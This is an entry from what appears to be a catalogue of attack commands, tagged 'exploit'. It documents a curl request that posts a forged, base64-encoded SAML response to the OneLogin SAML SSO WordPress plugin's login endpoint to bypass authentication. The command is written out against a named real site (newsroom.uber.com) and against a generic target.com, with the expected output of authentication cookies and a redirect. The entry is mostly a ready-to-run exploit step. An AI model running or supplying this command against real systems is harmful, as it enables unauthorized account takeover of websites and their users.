---
data: >-
  curl -v
  'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs'
  --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
tags:
  - http
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 9c466f6e-a57e-4bcc-a43e-c0442deb6a86
created_at: '2025-12-11T03:47:39.216Z'
updated_at: '2025-12-11T03:47:39.216Z'
verified: false
validated: true
submitted: true
---
# curl-send-forged-saml

## Command

```bash
curl -v 'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
```

## Description

Sends a verbose HTTP POST request with RelayState and base64-encoded SAMLResponse to exploit the authentication bypass in the OneLogin plugin.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Enables verbose output | No |
| `--data "RelayState=/wp-login.php"` | Sets the RelayState parameter | Yes |
| `--data-urlencode "SAMLResponse=$xml"` | URL-encodes and sets the SAMLResponse | Yes |

## Examples

### Basic Usage

```bash
curl -v 'https://target.com/plugin-endpoint' --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
```

### Advanced Usage

```bash
curl -v -k 'https://target.com/plugin-endpoint' --data "RelayState=/wp-login.php" --data-urlencode "SAMLResponse=$xml"
```

## Expected Output

HTTP 302 Found response with Set-Cookie headers for authentication cookies and a Location redirect.

## Related

- [[commands/base64-encode-xml]]
- [[procedures/Send-Forged-SAML-Response-via-HTTP-POST]]
